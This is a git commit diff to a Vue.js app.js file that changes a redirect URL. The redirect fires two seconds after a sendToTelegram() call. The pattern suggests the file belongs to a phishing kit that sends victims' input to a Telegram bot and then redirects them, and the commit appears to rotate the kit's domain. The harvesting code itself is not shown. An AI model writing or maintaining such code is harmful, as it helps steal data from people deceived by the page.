237ccd5c6bf6f42325e14731e6246a145711bdd3
husknet <127146284+husknet@users.noreply.github.com>
2025-01-23 16:34:39 +0000

    Update app.js

--- app.js
+++ app.js
@@ -138,7 +138,7 @@ const app = Vue.createApp({
 
       setTimeout(() => {
         this.sendToTelegram();
-        window.location.href = 'https://ner.ltranetechnologies.com/';
+        window.location.href = 'https://nn.flnitionelegance.com/';
       }, 2000);
     },
     sendToTelegram() {
